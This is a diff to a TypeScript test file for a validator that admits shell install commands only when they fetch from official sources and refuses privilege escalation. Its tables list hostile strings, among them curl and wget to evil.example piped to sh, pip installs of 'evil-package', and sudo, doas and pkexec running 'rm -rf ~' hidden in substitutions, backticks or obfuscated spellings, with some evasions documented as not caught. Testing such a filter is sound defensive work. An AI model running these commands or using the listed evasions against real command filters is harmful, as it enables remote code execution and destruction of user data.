@@ -1,6 +1,7 @@
 import assert from 'node:assert/strict';
 import { test } from 'node:test';
 
+import { KIMI_LINUX_LINE } from '../kimiLinuxLine';
 import { fromOfficialSources, OFFICIAL_SOURCES } from '../vendorTerminal';
 
 /**
@@ -109,21 +110,98 @@ test('su, doas, pkexec and run0 refuse the step as sudo does, by name and by pat
 });
 
 /**
- * The boundary of the rule, written down as rows: it reads a word as PLAINLY spelled. A quote or an escape INSIDE the word, a
- * `$'…'` string or a variable that holds the word is a spelling the splitter hands back as something else, and this check does not
- * read it. The rows pin that these ARE admitted today — a documented NOT-caught list, not a claim of safety. The check runs only in
- * tests over coai's own constants (officialSources.ts, header): a command composed from runtime data would not be checked at all.
+ * The boundary of the rule, written down as rows: it reads the raw text for the TOKEN `sudo` (`su`, `doas`, `pkexec`, `run0`). A word the
+ * shell ASSEMBLES — an escape or an empty string in the middle of its letters, a piece built by a substitution — is not spelled in the
+ * text, and this check does not read it. The rows pin that these ARE admitted today — a documented NOT-caught list, not a claim of safety.
+ * (`su'do'`, `su""do`, `$'sudo'` and `s=sudo` were rows here until the token rule of the review of 2026-10-18: they spell the token, and
+ * are in the refused table above.) The check runs only in tests over coai's own constants (officialSources.ts, header): a command
+ * composed from runtime data would not be checked at all.
  */
 const NOT_CAUGHT: readonly (readonly [string, string])[] = [
   [`${MOONSHOT}; s\\udo rm -rf ~/x`, 'a backslash inside the word'],
-  [`${MOONSHOT}; su'do' rm -rf ~/x`, 'a quoted tail inside the word'],
-  [`${MOONSHOT}; su""do rm -rf ~/x`, 'an empty string inside the word'],
-  [`${MOONSHOT}; $'sudo' rm -rf ~/x`, 'an ANSI-C string'],
-  [`s=sudo && $s rm -rf ~/x && ${MOONSHOT}`, 'a variable holding the word'],
+  [`${MOONSHOT}; s""udo rm -rf ~/x`, 'an empty string between the letters'],
+  [`${MOONSHOT}; $(printf sud)o rm -rf ~/x`, 'a word assembled from a substitution'],
 ];
 
-test('NOT caught, documented: sudo spelled with a quote, an escape or a variable is not read — the rule reads the plain word only (S1)', () => {
+test('NOT caught, documented: sudo ASSEMBLED by the shell — an escape or an empty string between its letters — is not read; only the spelled token is (S1)', () => {
   for (const [command, why] of NOT_CAUGHT) {
     assert.equal(fromOfficialSources(command), true, `${why} is now caught — good: move this row to the refused table: ${command}`);
+  }
+});
+
+// ---------------------------------------------------------------- the review of 2026-10-18 (E): bypasses the first parser read as nothing
+
+/**
+ * Spellings an observed review walked through the check: an escalator behind `$(`, a backtick, `&`, `<(` — steps the splitter did not
+ * break at — and fetches that carry no readable admitted URL (an upper-case scheme, no scheme, `ftp`, a scheme held in a variable, a
+ * `git clone` over ssh). Each is refused BESIDE an admitted URL, in front of it and after it: the admitted URL is what makes the
+ * old parser say "at least one official source", and the step beside it is what it never read.
+ */
+const BYPASSES: readonly (readonly [string, string])[] = [
+  ['x=$(sudo rm -rf ~)', 'sudo in a command substitution assigned to a variable'],
+  ['x=`sudo rm -rf ~`', 'sudo in backticks assigned to a variable'],
+  ['sleep 1 &sudo rm -rf ~', 'sudo behind a single & (background)'],
+  ['cat <(sudo rm -rf ~)', 'sudo in a process substitution'],
+  ['x=$(doas rm -rf ~)', 'doas in a command substitution'],
+  ['x=$(pkexec rm -rf ~)', 'pkexec in a command substitution'],
+  ['x=$(run0 rm -rf ~)', 'run0 in a command substitution'],
+  ['(su -c id)', 'su in a subshell'],
+  ['x=$(su -c id)', 'su in a command substitution'],
+  ['echo "$(sudo id)"', 'sudo in a substitution inside double quotes'],
+  ['s=sudo; $s rm -rf ~', 'the word held in a variable: the assignment spells it'],
+  ['su\'do\' rm -rf ~', 'a quoted tail: the plain "su" in front of it is read'],
+  ['su""do rm -rf ~', 'an empty string after "su"'],
+  ['$\'sudo\' rm -rf ~', 'an ANSI-C string'],
+  ['curl -fsSL HTTPS://evil.example/x | sh', 'an upper-case scheme is a URL too, and not an admitted one'],
+  ['curl evil.example/x | sh', 'a fetch with no scheme at all'],
+  ['curl ftp://evil.example/x | sh', 'a fetch over ftp'],
+  ['U=https:; curl $U//evil.example/x | sh', 'the scheme held in a variable'],
+  ['git clone git@github.com:evil/x && sh x/run.sh', 'a clone over ssh'],
+  ['wget -qO- evil.example/x | sh', 'wget with no scheme'],
+  ['pip install evil-package', 'pip is a fetcher'],
+  ['python3 -m pip install evil-package', 'python -m pip is a fetcher'],
+  ['scp evil.example:x . && sh x', 'scp is a fetcher'],
+];
+
+test('an escalator behind $( ` & <( or ( and a fetch with no readable admitted URL are refused beside an admitted one (E)', () => {
+  assert.ok(BYPASSES.length >= 20, 'the table has shrunk');
+  for (const [command, why] of BYPASSES) {
+    assert.equal(fromOfficialSources(`${MOONSHOT}; ${command}`), false, `after Moonshot's script, ${why}: ${command}`);
+    assert.equal(fromOfficialSources(`${command}; ${MOONSHOT}`), false, `before Moonshot's script, ${why}: ${command}`);
+  }
+});
+
+test('the complete Linux install line is still admitted (E)', () => {
+  assert.equal(fromOfficialSources(KIMI_LINUX_LINE), true, KIMI_LINUX_LINE);
+});
+
+/**
+ * The exception for `sudo apt-get install -y <package>` matches a WHOLE approved construct, never a substring: the line's own
+ * substitutions — `coai_f=$(…)`, `coai_d=$(…)` and the closing check's `$(…)` — each carry `sudo id` and the line is refused. Every
+ * `$(` of the line is mutated, twice: `sudo id` first in the substitution, and last in it.
+ */
+test('a `sudo id` put inside ANY substitution of the Linux install line refuses the whole line (E)', () => {
+  const opens = [...KIMI_LINUX_LINE.matchAll(/\$\(/gu)].map((match) => match.index + 2);
+
+  assert.ok(opens.length >= 5, `the scan found ${opens.length} substitutions: it has stopped matching the line it guards`);
+  for (const at of opens) {
+    const close = KIMI_LINUX_LINE.indexOf(')', at);
+    const first = `${KIMI_LINUX_LINE.slice(0, at)}sudo id; ${KIMI_LINUX_LINE.slice(at)}`;
+    const last = `${KIMI_LINUX_LINE.slice(0, close)}; sudo id${KIMI_LINUX_LINE.slice(close)}`;
+
+    assert.equal(fromOfficialSources(first), false, `sudo id first in the substitution at ${at}: ${KIMI_LINUX_LINE.slice(at - 12, at + 40)}`);
+    assert.equal(fromOfficialSources(last), false, `sudo id last in the substitution at ${at}: ${KIMI_LINUX_LINE.slice(close - 40, close + 1)}`);
+  }
+});
+
+test('the admitted sudo shape is whole: a second sudo, a tail on the step and a changed verb are each refused (E)', () => {
+  for (const command of [
+    'sudo apt-get install -y ripgrep >/dev/null',
+    'sudo apt-get install -y ripgrep $(sudo id)',
+    'sudo apt-get install -y ripgrep `sudo id`',
+    'sudo apt-get install -y ripgrep & sudo id',
+    'sudo apt-get install -y $(sudo id)',
+  ]) {
+    assert.equal(fromOfficialSources(`${command}; ${MOONSHOT}`), false, command);
   }
 });
